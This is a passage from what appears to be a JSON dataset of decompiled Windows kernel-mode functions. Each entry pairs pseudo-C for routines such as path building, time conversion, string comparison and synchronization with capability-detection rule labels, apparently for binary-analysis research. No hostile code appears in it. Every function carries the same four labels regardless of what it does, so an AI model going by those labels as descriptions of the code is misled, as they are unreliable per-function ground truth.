fcn.000357f0(var_8h);\n        if (var_24h != 0) {\n            arg_8h_00 = fcn.00078a2c(var_24h);\n            fcn.000359a0(arg_8h_00);\n            var_40h = 0xffffffff;\n        }\n    }\n    return var_40h;\n}\n",
        "token_count": 662
    },
    "00035fa0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035fa0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.000356c0(0x208);\n    if (arg_8h_00 == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        fcn.00036890(arg_8h_00, 0x104, arg_8h);\n        uVar1 = fcn.00035e20(arg_8h_00, arg_ch);\n        fcn.000357f0(arg_8h_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 172
    },
    "00036010": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00036010(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0xffffffff;\n    var_10h = 0xfffffffe;\n    iVar1 = fcn.00078a56(arg_8h, 0, 0, 0, &var_8h, arg_ch, arg_10h, &var_10h, 0);\n    if (iVar1 != 0) {\n        if (iVar1 == -0x3fffffef) {\n            var_4h = 0;\n        }\n        else {\n            arg_8h_00 = fcn.00078a2c(iVar1);\n            fcn.000359a0(arg_8h_00);\n            var_4h = 0xffffffff;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 239
    },
    "00036080": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00036080(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0xffffffff;\n    var_10h = 0xfffffffe;\n    iVar1 = fcn.000789e4(arg_8h, 0, 0, 0, &var_8h, arg_ch, arg_10h, &var_10h, 0);\n    if (iVar1 != 0) {\n        arg_8h_00 = fcn.00078a2c(iVar1);\n        fcn.000359a0(arg_8h_00);\n        var_4h = 0xffffffff;\n    }\n    return var_4h;\n}\n",
        "token_count": 209
    },
    "000361b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000361b0(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_10h == 0) {\n        var_4h = 0;\n        var_8h = arg_ch;\n        iVar1 = fcn.000789cc(arg_8h, &var_10h, &var_8h, 8, 0xe);\n        if (iVar1 != 0) {\n            arg_8h_00 = fcn.00078a2c(iVar1);\n            fcn.000359a0(arg_8h_00);\n            arg_ch = 0xffffffff;\n        }\n    }\n    else {\n        fcn.000359a0(0x16);\n        arg_ch = 0xffffffff;\n    }\n    return arg_ch;\n}\n",
        "token_count": 228
    },
    "00036210": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00036210(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    uint var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    var_4h = fcn.000356c0(0x208);\n    if (var_4h == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        fcn.00036970(var_4h, 0x104, arg_8h);\n        fcn.000789c0(&var_ch, var_4h);\n        var_28h = 0x18;\n        var_24h = 0;\n        var_1ch = 0x40;\n        var_20h = &var_ch;\n        var_18h = 0;\n        var_14h = 0;\n        var_10h = fcn.000789d8(&var_28h);\n        fcn.000357f0(var_4h);\n        if (var_10h == 0) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = fcn.00078a2c(var_10h);\n            fcn.000359a0(uVar1);\n            uVar1 = 0xffffffff;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 339
    },
    "000362c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000362c0(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.000356c0(0x208);\n    if (arg_8h_00 == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        fcn.00036890(arg_8h_00, 0x104, arg_8h);\n        uVar1 = fcn.00036210(arg_8h_00);\n        fcn.000357f0(arg_8h_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 164
    },
    "00036320": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00036320(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint var_4h;\n    \n    (**0x80051104)(&var_10h);\n    uVar1 = fcn.00078bee(var_10h + 0x2ac18000, (var_ch + -0x19db1de) - (var_10h < 0xd53e8000), 10000000, 0);\n    if (arg_8h != NULL) {\n        *arg_8h = uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 152
    },
    "00036370": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00036370(char *arg_8h, char **arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    char *var_4h;\n    \n    iVar1 = fcn.00078b2e(arg_8h, arg_10h, &var_8h);\n    if (iVar1 != 0) {\n        var_8h = 0;\n    }\n    if (arg_ch != NULL) {\n        for (var_4h = arg_8h;\n            ((('/' < *var_4h && (*var_4h < ':')) || (('`' < *var_4h && (*var_4h < 'g')))) ||\n            (('@' < *var_4h && (*var_4h < 'G')))); var_4h = var_4h + 1) {\n        }\n        *arg_ch = var_4h;\n    }\n    return var_8h;\n}\n",
        "token_count": 221
    },
    "00036400": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00036400(uint16_t *arg_8h, uint16_t **arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_8h;\n    uint16_t *var_4h;\n    \n    fcn.000789c0(&var_10h, arg_8h);\n    iVar1 = fcn.00078b3a(&var_10h, arg_10h, &var_8h);\n    if (iVar1 != 0) {\n        var_8h = 0;\n    }\n    if (arg_ch != NULL) {\n        for (var_4h = arg_8h;\n            (((0x2f < *var_4h && (*var_4h < 0x3a)) || ((0x60 < *var_4h && (*var_4h < 0x67)))) ||\n            ((0x40 < *var_4h && (*var_4h < 0x47)))); var_4h = var_4h + 1) {\n        }\n        *arg_ch = var_4h;\n    }\n    return var_8h;\n}\n",
        "token_count": 265
    },
    "000364d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000364d0(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    ushort extraout_var;\n    ushort extraout_var_00;\n    uint16_t *in_EDX;\n    \n    if (arg_10h != 0) {\n        for (; arg_10h != 0; arg_10h = arg_10h + -1) {\n            iVar1 = fcn.00078b28(in_EDX & 0xffff0000 | *arg_8h);\n            iVar2 = fcn.00078b28(CONCAT22(extraout_var, *arg_ch));\n            if (iVar1 != iVar2) {\n                uVar3 = fcn.00078b28(CONCAT22(extraout_var_00, *arg_8h));\n                uVar4 = fcn.00078b28(uVar3 & 0xffff0000 | *arg_ch);\n                return (uVar3 & 0xffff) - (uVar4 & 0xffff);\n            }\n            if (*arg_8h == 0) {\n                return 0;\n            }\n            arg_8h = arg_8h + 1;\n            in_EDX = arg_ch + 1;\n            arg_ch = in_EDX;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 326
    },
    "00036570": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00036570(uint *arg_8h, ushort *arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    ushort uVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *arg_8h;\n    uVar2 = arg_8h[1];\n    uVar5 = fcn.00078c00(uVar1, uVar2, 10000000, 0);\n    uVar3 = fcn.00078bee(uVar5, 10000, 0);\n    arg_ch[7] = uVar3;\n    uVar5 = fcn.00078bee(uVar1, uVar2, 10000000, 0);\n    var_10h = fcn.00078bee(uVar5, 0x15180, 0);\n    for (var_14h = fcn.00078c00(uVar5, 0x15180, 0); var_14h < 0; var_14h = var_14h + 0x15180) {\n        var_10h = var_10h + -1;\n    }\n    for (; 0x1517f < var_14h; var_14h = var_14h + -0x15180) {\n        var_10h = var_10h + 1;\n    }\n    arg_ch[4] = var_14h / 0xe10;\n    arg_ch[5] = (var_14h % 0xe10) / 0x3c;\n    arg_ch[6] = (var_14h % 0xe10) % 0x3c;\n    arg_ch[2] = var_10h % 7;\n    var_ch = 0x641;\n    while( true ) {\n        iVar4 = fcn.00036750(var_ch);\n        if (var_10h < *(iVar4 * 4 + -0x7ffada88)) break;\n        var_ch = var_ch + 1;\n        var_10h = var_10h - *(iVar4 * 4 + -0x7ffada88);\n    }\n    *arg_ch = var_ch;\n    iVar4 = iVar4 * 0x30 + -0x7ffada80;\n    for (var_18h = 0; *(iVar4 + var_18h * 4) <= var_10h; var_18h = var_18h + 1) {\n        var_10h = var_10h - *(iVar4 + var_18h * 4);\n    }\n    arg_ch[1] = var_18h + 1;\n    arg_ch[3] = var_10h + 1;\n    return;\n}\n",
        "token_count": 690
    },
    "000367a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.000367a0(int32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_34h;\n    uint var_30h;\n    uint16_t var_2ch;\n    uint16_t var_2ah;\n    uint var_28h;\n    uint16_t var_24h;\n    uint var_20h;\n    uint var_10h;\n    uint var_ch;\n    \n    _var_40h = fcn.00078be2(*arg_8h, *arg_8h >> 0x1f, 10000000, 0);\n    _var_40h = _var_40h + 0x19db1ded53e8000;\n    var_34h = fcn.00078b16(3, &var_20h, 0x20, 0);\n    if (var_34h == 0) {\n        _var_40h = _var_40h - CONCAT44(var_ch, var_10h);\n    }\n    fcn.00036570(&var_40h, &var_30h);\n    arg_ch[2] = var_28h;\n    arg_ch[8] = 0;\n    arg_ch[3] = var_2ah;\n    arg_ch[1] = var_28h._2_2_;\n    arg_ch[4] = var_30h._2_2_ - 1;\n    *arg_ch = var_24h;\n    arg_ch[6] = var_2ch;\n    arg_ch[7] = 0;\n    arg_ch[5] = var_30h - 0x76c;\n    return;\n}\n",
        "token_count": 397
    },
    "00036890": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00036890(int16_t *arg_8h, int32_t arg_ch, char *arg_10h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_ch;\n    int16_t *var_8h;\n    uint var_4h;\n    \n    if (*arg_10h == '\\\\') {\n        fcn.00037880(arg_10h, arg_8h, arg_ch);\n    }\n    else if ((*arg_10h == '\\0') || (arg_10h[1] != ':')) {\n        fcn.0002bf70(arg_8h, arg_ch);\n        var_8h = arg_8h;\n        do {\n            iVar1 = *var_8h;\n            var_8h = var_8h + 1;\n        } while (iVar1 != 0);\n        iVar2 = var_8h - (arg_8h + 1) >> 1;\n        fcn.000789c6(arg_8h + iVar2, arg_ch - iVar2, 0x80051644, arg_10h);\n        arg_8h[arg_ch + -1] = 0;\n    }\n    else {\n        fcn.000789c6(arg_8h, arg_ch, 0x800547d8, arg_10h);\n        arg_8h[arg_ch + -1] = 0;\n    }\n    return;\n}\n",
        "token_count": 325
    },
    "00036970": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00036970(int16_t *arg_8h, int32_t arg_ch, int16_t *arg_10h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_ch;\n    int16_t *var_8h;\n    uint var_4h;\n    \n    if (*arg_10h == 0x5c) {\n        fcn.00078a08(arg_8h, arg_10h, arg_ch);\n        arg_8h[arg_ch + -1] = 0;\n    }\n    else if ((*arg_10h == 0) || (arg_10h[1] != 0x3a)) {\n        fcn.0002bf70(arg_8h, arg_ch);\n        var_8h = arg_8h;\n        do {\n            iVar1 = *var_8h;\n            var_8h = var_8h + 1;\n        } while (iVar1 != 0);\n        fcn.00078a5c(arg_8h, arg_10h, arg_ch - (var_8h - (arg_8h + 1) >> 1));\n        arg_8h[arg_ch + -1] = 0;\n    }\n    else {\n        iVar2 = fcn.000789c6(arg_8h, arg_ch, 0x800547e8, arg_10h);\n        if ((iVar2 < 0) || (iVar2 == arg_ch)) {\n            arg_8h[arg_ch + -1] = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 359
    },
    "00036a60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n\nint32_t __cdecl fcn.00036a60(uint arg_8h, uint arg_ch, uint arg_10h, char *arg_14h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint var_48h;\n    uint var_40h;\n    char *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_14h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000356c0(0x208);\n    if (var_4h == 0) {\n        iVar2 = 0;\n    }\n    else {\n        for (var_ch = 0; var_ch < 100; var_ch = var_ch + 1) {\n            fcn.0002c4c0(arg_14h, 0x104, 0x800547f8, arg_8h);\n            fcn.00036890(var_4h, 0x104, arg_14h);\n            fcn.000789c0(&var_1ch, var_4h);\n            var_34h = 0x18;\n            var_30h = 0;\n            var_28h = 0x40;\n            var_2ch = &var_1ch;\n            var_24h = 0;\n            var_20h = 0;\n            iVar2 = fcn.0001f080(&var_8h, 2, &var_34h, &var_14h, 0, 0x100, 0, 2, 0, 0, 0);\n            if (iVar2 == 0) {\n                fcn.000789b4(var_8h);\n                break;\n            }\n            arg_8h_00 = fcn.00078a2c(iVar2);\n            fcn.000359a0(arg_8h_00);\n        }\n        fcn.000357f0(var_4h);\n        var_3ch = arg_14h;\n        do {\n            cVar1 = *var_3ch;\n            var_3ch = var_3ch + 1;\n        } while (cVar1 != '\\0');\n        iVar2 = var_3ch - (arg_14h + 1);\n    }\n    return iVar2;\n}\n",
        "token_count": 596
    },
    "00036bb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00036bb0(uint arg_8h, int32_t arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t arg_8h_00;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint var_2ch;\n    uint var_24h;\n    int16_t *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    arg_8h_00 = fcn.00035fa0(arg_8h, 0);\n    if (arg_8h_00 == -1) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        puVar3 = fcn.000356c0(0x218);\n        if (puVar3 == NULL) {\n            fcn.00036000(arg_8h_00);\n            fcn.000359a0(0xc);\n            uVar2 = 0xffffffff;\n        }\n        else {\n            *puVar3 = 0;\n            *(puVar3 + 4) = 0;\n            var_4h = fcn.00078ace(arg_ch, 0x5c);\n            if (var_4h != 0) {\n                arg_ch = var_4h + 1;\n            }\n            fcn.00037880(arg_ch, puVar3 + 0xc, 0x104);\n            var_20h = puVar3 + 0xc;\n            do {\n                iVar1 = *var_20h;\n                var_20h = var_20h + 1;\n            } while (iVar1 != 0);\n            *(puVar3 + 8) = (var_20h - (puVar3 + 0xe) >> 1) << 1;\n            iVar4 = fcn.000789cc(arg_8h_00, &var_ch, puVar3, *(puVar3 + 8) + 0x10, 10);\n            fcn.00036000(arg_8h_00);\n            if (iVar4 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = fcn.00078a2c(iVar4);\n                fcn.000359a0(uVar2);\n                uVar2 = 0xffffffff;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 553
    },
    "00036d60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00036d60(int32_t arg_8h, uchar *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if ((arg_ch == NULL) || (arg_10h == 0)) {\n        return 0;\n    }\n    if (*0x800ce6f4 == 0) {\n        iVar1 = (**0x800510e0)(&fcn.00036d60::var_4h, 0, 0, 0, 0, 0x80076ce0, 0x800ce6f4);\n        if (iVar1 != 0) {\n            return 0;\n        }\n        var_4h = 0;\n        var_8h = 0;\n        var_ch = 0x36db6;\n        fcn.00078a62();\n        var_ch = var_4h;\n        fcn.000789b4();\n        if (*0x800ce6f4 == 0) {\n            *arg_ch = 0;\n            return 0;\n        }\n    }\n    if (arg_8h == 0) {\n        var_ch = (**0x800511c0)();\n    }\n    else {\n        iVar1 = (**0x800511d8)(arg_8h, &fcn.00036d60::var_ch);\n        if (iVar1 != 0) {\n            return 0;\n        }\n    }\n    var_8h = var_ch + *0x800ce6f4;\n    fcn.00078ac8(arg_ch, var_8h, arg_10h);\n    arg_ch[arg_10h + -1] = 0;\n    if (arg_8h != 0) {\n        (**0x800512e0)();\n    }\n    return 1;\n}\n",
        "token_count": 425
    },
    "00036e40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00036e40(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (*0x800ce700 == 0) {\n        iVar1 = (**0x800510e0)(&var_4h, 0, 0, 0, 0, 0x80076eb0, 0x800ce700);\n        if (iVar1 != 0) {\n            return 0;\n        }\n        fcn.00078a62(var_4h, 0, 0);\n        fcn.000789b4(var_4h);\n        if (*0x800ce700 == 0) {\n            return 0;\n        }\n    }\n    *arg_8h = *0x800ce700;\n    return 1;\n}\n",
        "token_count": 185
    },
    "00036f40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00036f40(uint *arg_8h)\n\n{\n    if (arg_8h[3] != 0) {\n        fcn.000357f0(arg_8h[3]);\n    }\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    return;\n}\n",
        "token_count": 101
    },
    "00036f70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00036f70(int32_t *arg_8h)\n\n{\n    bool bVar1;\n    uint var_8h;\n    uint var_1h;\n    \n    (**0x80051194)(arg_8h[3] + 0x28, 0, 0, 0, 0);\n    if ((arg_8h[1] < 1) && (arg_8h[2] != -1)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        *arg_8h = *arg_8h + 1;\n    }\n    else {\n        arg_8h[2] = arg_8h[2] + 1;\n    }\n    (**0x800511ac)(arg_8h[3] + 0x28, 0);\n    if (bVar1) {\n        (**0x80051194)(arg_8h[3], 0, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 256
    },
    "00037020": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00037020(int32_t *arg_8h)\n\n{\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 1;\n    (**0x80051194)(arg_8h[3] + 0x28, 0, 0, 0, 0, 0, 1);\n    arg_8h[2] = arg_8h[2] + -1;\n    if (arg_8h[2] == 0) {\n        if (arg_8h[1] < 1) {\n            if (0 < *arg_8h) {\n                arg_8h[2] = *arg_8h;\n                *arg_8h = 0;\n                var_8h = arg_8h[3];\n                var_4h = arg_8h[2];\n            }\n        }\n        else {\n            arg_8h[2] = -1;\n            arg_8h[1] = arg_8h[1] + -1;\n            var_8h = arg_8h[3] + 0x14;\n        }\n    }\n    (**0x800511ac)(arg_8h[3] + 0x28, 0);\n    if (var_8h != 0) {\n        (**0x800511e0)(var_8h, 0, var_4h, 0);\n    }\n    return;\n}\n",
        "token_count": 370
    },
    "00037100": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00037100(int32_t arg_8h)\n\n{\n    bool bVar1;\n    uint var_4h;\n    \n    (**0x80051194)(*(arg_8h + 0xc) + 0x28, 0, 0, 0, 0);\n    bVar1 = *(arg_8h + 8) != 0;\n    if (bVar1) {\n        *(arg_8h + 4) = *(arg_8h + 4) + 1;\n    }\n    else {\n        *(arg_8h + 8) = 0xffffffff;\n    }\n    (**0x800511ac)(*(arg_8h + 0xc) + 0x28, 0);\n    if (bVar1) {\n        (**0x80051194)(*(arg_8h + 0xc) + 0x14, 0, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 218
    },
    "00037190": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00037190(int32_t *arg_8h)\n\n{\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 1;\n    (**0x80051194)(arg_8h[3] + 0x28, 0, 0, 0, 0, 0, 1);\n    arg_8h[2] = 0;\n    if (arg_8h[1] < 1) {\n        if (0 < *arg_8h) {\n            arg_8h[2] = *arg_8h;\n            *arg_8h = 0;\n            var_8h = arg_8h[3];\n            var_4h = arg_8h[2];\n        }\n    }\n    else {\n        arg_8h[2] = -1;\n        arg_8h[1] = arg_8h[1] + -1;\n        var_8h = arg_8h[3] + 0x14;\n    }\n    (**0x800511ac)(arg_8h[3] + 0x28, 0);\n    if (var_8h != 0) {\n        (**0x800511e0)(var_8h, 0, var_4h, 0);\n    }\n    return;\n}\n",
        "token_count": 345
    },
    "00037260": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00037260(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == NULL) {\n        var_4h = -0x3fffff11;\n    }\n    else {\n        iVar1 = fcn.00035150();\n        if (iVar1 == 0) {\n            var_4h = -0x3fffffff;\n        }\n        else {\n            iVar2 = fcn.00078b46(1);\n            iVar3 = fcn.000356c0(iVar2 + 0x24);\n            *arg_8h = iVar3;\n            if (*arg_8h == 0) {\n                var_4h = -0x3fffff66;\n            }\n            else {\n                var_4h = fcn.00078b10(*arg_8h, 1);\n                if (((var_4h == 0) && (var_4h = fcn.00078b52(*arg_8h, 1, 0, 0),  var_4h == 0)) &&\n                   ((iVar1 == 0x1b || (iVar1 == 0x26)))) {\n                    iVar1 = *arg_8h;\n                    var_4h = fcn.00078b4c(iVar1 + 0x14, iVar2 + 0x10, 2);\n                    if (var_4h == 0) {\n                        *(iVar1 + 0x18) = 1;\n                        *(iVar1 + 0x1c) = 0x11;\n                        *(iVar1 + 0x1d) = 0;\n                        *(iVar1 + 0x1e) = 0xc;\n                        *(iVar1 + 0x20) = 0;\n                        var_4h = fcn.00078b5e(iVar1 + 0x24, 